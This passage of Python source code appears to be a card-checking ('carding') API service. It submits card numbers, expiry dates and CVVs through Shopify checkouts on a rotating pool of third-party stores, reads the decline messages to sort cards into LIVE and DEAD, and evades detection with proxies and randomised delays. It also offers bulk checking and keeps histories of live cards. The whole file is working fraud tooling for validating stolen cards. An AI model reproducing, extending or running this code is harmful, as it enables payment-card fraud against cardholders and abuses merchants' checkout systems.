                    "_method":                                       "patch",
                    "checkout[payment_gateway]":                     "credit_card",
                    "checkout[credit_card][number]":                  cc,
                    "checkout[credit_card][name]":                    f"{idn['first']} {idn['last']}",
                    "checkout[credit_card][month]":                   str(month),
                    "checkout[credit_card][year]":                    str(year),
                    "checkout[credit_card][verification_value]":      cvv,
                    "button":                                         "",
                }
            )
            if r is not None:
                res = self._parse(r)
                if res["result"] not in ("ERROR",):
                    return res
        except Exception:
            pass

        # method 4: complete checkout
        try:
            r = self.hs.post_form(
                self._url(f"/checkouts/{token}/complete"),
                {
                    "checkout[payment_gateway]":                    "shopify_payments",
                    "checkout[credit_card][number]":                 cc,
                    "checkout[credit_card][name]":                   f"{idn['first']} {idn['last']}",
                    "checkout[credit_card][month]":                  str(month),
                    "checkout[credit_card][year]":                   str(year),
                    "checkout[credit_card][verification_value]":     cvv,
                }
            )
            if r is not None:
                return self._parse(r)
        except Exception as e:
            return {"result":"ERROR","reason":str(e),"message":"","is_3ds":False}

        return {"result":"ERROR","reason":"ALL_PAY_FAILED","message":"","is_3ds":False}

    # ── parse response ───────────────────

    def _parse(self, r):
        try:
            url  = getattr(r,"url","")
            text = r.text.lower() if hasattr(r,"text") else ""
            is_3ds = any(x in text for x in TDS)

            # URL signals
            if "thank_you" in url or "thank-you" in url:
                return {"result":"LIVE","reason":"APPROVED","message":"Order placed","is_3ds":False}
            if "processing" in url:
                return {"result":"LIVE","reason":"PROCESSING","message":"Payment processing","is_3ds":False}

            # text live
            live_texts = [
                "thank you for your order","order confirmed","order #",
                "payment successful","your order has been received",
                "order has been placed","your order is confirmed",
            ]
            for s in live_texts:
                if s in text:
                    return {"result":"LIVE","reason":"APPROVED","message":s,"is_3ds":False}

            # bank live signals
            bank_live = [
                "insufficient funds","do not honor","not permitted",
                "restricted","transaction not allowed","call your bank",
                "do_not_honor","generic_decline","security violation",
                "exceeds limit","velocity","refer to card issuer",
            ]
            for s in bank_live:
                if s in text:
                    return {"result":"LIVE","reason":s.upper().replace(" ","_"),
                            "message":s,"is_3ds":False}

            # 3DS
            if is_3ds:
                return {"result":"LIVE","reason":"3DS_REQUIRED",
                        "message":"3D Secure authentication required","is_3ds":True}

            # dead
            dead_texts = [
                "card was declined","payment was declined",
                "card number is invalid","security code is invalid",
                "expiration date is invalid","card has expired",
                "your card has been declined","number is incorrect",
                "card is not valid","payment could not be processed",
            ]
            for s in dead_texts:
                if s in text:
                    return {"result":"DEAD","reason":s.upper().replace(" ","_"),
                            "message":s,"is_3ds":False}

            # JSON parse
            try:
                data   = r.json()

                # payment_errors
                errors = data.get("checkout",{}).get("payment_errors",[])
                if errors:
                    err = str(errors[0]).lower()
                    if any(x in err for x in LIVE_MSGS):
                        return {"result":"LIVE","reason":"BANK_SIGNAL","message":err,"is_3ds":False}
                    if any(x in err for x in TDS):
                        return {"result":"LIVE","reason":"3DS_REQUIRED","message":err,"is_3ds":True}
                    if any(x in err for x in DEAD_MSGS):
                        return {"result":"DEAD","reason":"DECLINED","message":err,"is_3ds":False}

                # transaction
                txn    = data.get("payment",{}).get("transaction",{})
                status = txn.get("status","")
                error  = txn.get("error_code","")
                msg    = txn.get("message","") or ""

                if status in ("success","pending"):
                    return {"result":"LIVE","reason":"APPROVED","message":msg,"is_3ds":False}
                if error in LIVE_CODES:
                    return {"result":"LIVE","reason":error.upper(),"message":msg,"is_3ds":False}
                if error in DEAD_CODES:
                    return {"result":"DEAD","reason":error.upper(),"message":msg,"is_3ds":False}
                if status in ("failure","failed"):
                    if error:
                        return {"result":"LIVE","reason":error.upper(),"message":msg,"is_3ds":False}
                    return {"result":"DEAD","reason":"GENERIC_FAILURE","message":msg,"is_3ds":False}

            except Exception:
                pass

            if r.status_code in (200, 302):
                return {"result":"UNKNOWN","reason":"NO_SIGNAL","message":"","is_3ds":False}

            return {"result":"ERROR","reason":f"HTTP_{r.status_code}","message":"","is_3ds":False}

        except Exception as e:
            return {"result":"ERROR","reason":str(e),"message":"","is_3ds":False}


def run_checkout(shop, cc, month, year, cvv, proxy=None):
    try:
        co = Checkout(shop, proxy=proxy)
        if not co.add_cart():
            return {"result":"ERROR","reason":"CART_FAILED","message":"","is_3ds":False,"amount":co.amount}
        token = co.get_token()
        if not token:
            return {"result":"ERROR","reason":"TOKEN_FAILED","message":"","is_3ds":False,"amount":co.amount}
        co.fill_info(token)
        time.sleep(random.uniform(0.5, 1.0))
        co.pick_shipping(token)
        time.sleep(random.uniform(0.3, 0.7))
        result           = co.pay(token, cc, month, year, cvv)
        result["amount"] = co.amount
        return result
    except Exception as e:
        return {"result":"ERROR","reason":str(e),"message":"","is_3ds":False,"amount":"1.00"}


# ─────────────────────────────────────────
# CORE CHECK
# ─────────────────────────────────────────

def check_card(cc, month, year, cvv, proxy=None):
    tried = set()
    for attempt in range(10):
        shop = shop_pool.get()
        if not shop:
            time.sleep(1.5)
            continue
        if shop["domain"] in tried:
            time.sleep(0.3)
            continue
        tried.add(shop["domain"])
        try:
            result = run_checkout(shop, cc, month, year, cvv, proxy=proxy)
            if result["result"] in ("LIVE","DEAD"):
                shop_pool.mark_win(shop["domain"])
                result["shop"] = shop["domain"]
                return result
            if result["result"] in ("UNKNOWN","ERROR"):
                shop_pool.mark_fail(shop["domain"])
                continue
        except Exception as e:
            shop_pool.mark_fail(shop["domain"])
            time.sleep(0.5)

    return {"result":"ERROR","reason":"MAX_RETRIES","message":"",
            "amount":"0.00","shop":"none","is_3ds":False}


def auto_find_product(domain, proxy=None):
    """Find cheap product on any domain"""
    try:
        s = HumanSession(proxy=proxy)
        r = s.get(f"https://{domain}/products.json?limit=250")
        if not r or r.status_code != 200:
            return None
        for p in r.json().get("products", []):
            for v in p.get("variants", []):
                try:
                    price = float(v.get("price", 999))
                except Exception:
                    continue
                if 0.0 < price <= 10.0 and v.get("available", True):
                    return {
                        "domain":     domain,
                        "variant_id": v["id"],
                        "handle":     p.get("handle",""),
                        "title":      p.get("title",""),
                        "price":      max(price, 1.0),
                        "healthy":    True,
                        "failures":   0,
                    }
    except Exception:
        pass
    return None


def fmt(cc, month, year, cvv, result, elapsed, proxy_used=False):
    try:
        b = bin_lookup(cc)
    except Exception:
        b = {"brand":"UNKNOWN","issuer":"UNKNOWN","country":"UNKNOWN",
             "emoji":"🌐","type":"UNKNOWN","level":"UNKNOWN"}
    is_live = result.get("result") == "LIVE"
    is_3ds  = result.get("is_3ds", False)
    reason  = result.get("reason","UNKNOWN")

    if is_live and is_3ds:
        resp = "CCN - 3DS REQUIRED"
    elif is_live:
        resp = f"CCN - {reason}"
    else:
        resp = reason

    proxy_status = "Used" if (proxy_used or proxy_mgr.status()["live"] > 0) else "Not Used"

    return {
        "cc":       f"{cc}|{month}|{year}|{cvv}",
        "Gateway":  "Shopify Payments",
        "Response": resp,
        "Amount":   result.get("amount","1.00"),
        "Currency": "USD",
        "Brand":    b["brand"],
        "Type":     b["type"],
        "Level":    b["level"],
        "Issuer":   b["issuer"],
        "Country":  f"{b['emoji']} {b['country']}",
        "3DS":      is_3ds,
        "Shop":     result.get("shop",""),
        "Status":   is_live,
        "Proxy":    proxy_status,
        "Time":     f"{elapsed:.2f}s",
    }

# ─────────────────────────────────────────
# STARTUP
# ─────────────────────────────────────────

@app.on_event("startup")
async def on_startup():
    threading.Thread(target=proxy_mgr.start, daemon=True).start()
    threading.Thread(target=shop_pool.start, daemon=True).start()
    print("[+] started")

@app.exception_handler(Exception)
async def err(request: Request, exc: Exception):
    return JSONResponse(status_code=500, content={"error":str(exc)})

class CardReq(BaseModel):
    cc: str; month: str; year: str; cvv: str

class BulkReq(BaseModel):
    cards: list[str]
    delay: Optional[float] = 1.2

# ─────────────────────────────────────────
# ROUTES
# ─────────────────────────────────────────

@app.get("/")
def root():
    try:
        alive = sum(1 for s in shop_pool._shops if s["healthy"])
        total = len(shop_pool._shops)
        prx   = proxy_mgr.status()["live"]
    except Exception:
        alive = 0; total = 0; prx = 0
    return {"status":"alive","shops":f"{alive}/{total}","proxies":prx}


@app.get("/shopify")
def shopify_check(
    cc:    str = "",
    site:  str = "",
    proxy: str = "",
    key:   str = "",
):
    if key != API_KEY:
        return JSONResponse(401, {"error":"INVALID_KEY"})
    if not cc:
        return JSONResponse(400, {"error":"cc required"})

    parts = cc.strip().split("|")
    if len(parts) != 4:
        return JSONResponse(400, {"error":"cc format: number|mm|yy|cvv"})

    card, month, year, cvv = parts
    ok, reason = validate(card, month, year, cvv)
    if not ok:
        return {"cc":cc,"Response":reason,"Status":False,"Time":"0.00s"}

    if is_dup(card):
        return {"cc":cc,"Response":"DUPLICATE_CARD","Status":False,"Time":"0.00s"}

    # proxy setup
    proxy_dict = None
    proxy_used = False
    if proxy.strip():
        p = proxy.strip()
        if not p.startswith("http"):
            p = "http://" + p
        proxy_dict = {"http": p, "https": p}
        proxy_used = True

    start = time.time()

    # manual site
    if site.strip():
        domain = site.strip().replace("https://","").replace("http://","").rstrip("/")
        shop   = auto_find_product(domain, proxy=proxy_dict)
        if not shop:
            return {"cc":cc,"Response":"NO_PRODUCT_FOUND","Status":False,
                    "Shop":domain,"Time":f"{time.time()-start:.2f}s"}
        res = run_checkout(shop, card, month, year, cvv, proxy=proxy_dict)
        res["shop"] = domain
    else:
        res = check_card(card, month, year, cvv, proxy=proxy_dict)

    elapsed = time.time() - start
    out     = fmt(card, month, year, cvv, res, elapsed, proxy_used=proxy_used)
    record(out["cc"], res, elapsed)
    return out


@app.get("/check")
def check_get(cc:str="", month:str="", year:str="", cvv:str="", key:str=""):
    if key != API_KEY:
        return JSONResponse(401, {"error":"INVALID_KEY"})
    if rate_limited(key):
        return JSONResponse(429, {"error":"RATE_LIMIT"})
    ok, reason = validate(cc, month, year, cvv)
    if not ok:
        return {"cc":f"{cc}|{month}|{year}|{cvv}","Gateway":"Shopify Payments",
                "Response":reason,"Status":False,"Time":"0.00s"}
    if is_dup(cc):
        return {"cc":f"{cc}|{month}|{year}|{cvv}","Gateway":"Shopify Payments",
                "Response":"DUPLICATE_CARD","Status":False,"Time":"0.00s"}
    start   = time.time()
    res     = check_card(cc, month, year, cvv)
    elapsed = time.time() - start
    out     = fmt(cc, month, year, cvv, res, elapsed)
    record(out["cc"], res, elapsed)
    return out


@app.get("/shops")
def shops_get(key:str=""):
    if key != API_KEY:
        return JSONResponse(401, {"error":"INVALID_KEY"})
    return {"shops": shop_pool.status()}


@app.get("/proxies")
def proxies_get(key:str=""):
    if key != API_KEY:
        return JSONResponse(401, {"error":"INVALID_KEY"})
    return proxy_mgr.status()


@app.get("/stats")
def stats_get(key:str=""):
    if key != API_KEY:
        return JSONResponse(401, {"error":"INVALID_KEY"})
    with _hl:
        return {"global":dict(_st),"hourly":dict(_hr)}


@app.get("/history/live")
def live_get(key:str=""):
    if key != API_KEY:
        return JSONResponse(401, {"error":"INVALID_KEY"})
    with _hl:
        return {"cards":list(_lh)}


@app.get("/history/dead")
def dead_get(key:str=""):
    if key != API_KEY:
        return JSONResponse(401, {"error":"INVALID_KEY"})
    with _hl:
        return {"cards":list(_dh)}


@app.get("/logs")
def logs_get(key:str=""):
    if key != API_KEY:
        return JSONResponse(401, {"error":"INVALID_KEY"})
    with _hl:
        return {"logs":list(_lg)}


@app.get("/duplicate/clear")
def clear_get(key:str=""):
    if key != API_KEY:
        return JSONResponse(401, {"error":"INVALID_KEY"})
    with _seen_lock:
        _seen.clear()
    return {"status":"cleared"}


@app.post("/check")
async def check_post(request: Request):
    key = request.headers.get("x-api-key","")
    if key != API_KEY:
        return JSONResponse(401, {"error":"INVALID_KEY"})
    if rate_limited(key):
        return JSONResponse(429, {"error":"RATE_LIMIT"})
    try:
        b     = await request.json()
        cc    = b.get("cc","")
        month = b.get("month","")
        year  = b.get("year","")
        cvv   = b.get("cvv","")
    except Exception:
        return JSONResponse(400, {"error":"BAD_JSON"})
    ok, reason = validate(cc, month, year, cvv)
    if not ok:
        return {"cc":f"{cc}|{month}|{year}|{cvv}","Response":reason,"Status":False,"Time":"0.00s"}
    if is_dup(cc):
        return {"cc":f"{cc}|{month}|{year}|{cvv}","Response":"DUPLICATE_CARD","Status":False,"Time":"0.00s"}
    start   = time.time()
    res     = check_card(cc, month, year, cvv)
    elapsed = time.time() - start
    out     = fmt(cc, month, year, cvv, res, elapsed)
    record(out["cc"], res, elapsed)
    return out


@app.post("/bulk")
async def bulk_post(request: Request):
    key = request.headers.get("x-api-key","")
    if key != API_KEY:
        return JSONResponse(401, {"error":"INVALID_KEY"})
    try:
        b     = await request.json()
        cards = b.get("cards",[])
        delay = float(b.get("delay",1.2))
    except Exception:
        return JSONResponse(400, {"error":"BAD_JSON"})
    results = []
    for line in cards:
        try:
            p = line.strip().split("|")
            if len(p) != 4:
                results.append({"cc":line,"Response":"BAD_FORMAT","Status":False})
                continue
            cc, month, year, cvv = p
            ok, reason = validate(cc, month, year, cvv)
            if not ok:
                results.append({"cc":line,"Response":reason,"Status":False})
                continue
            if is_dup(cc):
                results.append({"cc":line,"Response":"DUPLICATE_CARD","Status":False})
                continue
            start   = time.time()
            res     = check_card(cc, month, year, cvv)
            elapsed = time.time() - start
            out     = fmt(cc, month, year, cvv, res, elapsed)
            record(out["cc"], res, elapsed)
            results.append(out)
            time.sleep(delay + random.uniform(0,0.3))
        except Exception as e:
            results.append({"cc":line,"Response":str(e),"Status":False})
    return {
        "total":   len(results),
        "live":    sum(1 for r in results if r.get("Status")),
        "dead":    sum(1 for r in results if not r.get("Status")),
        "results": results,
    }
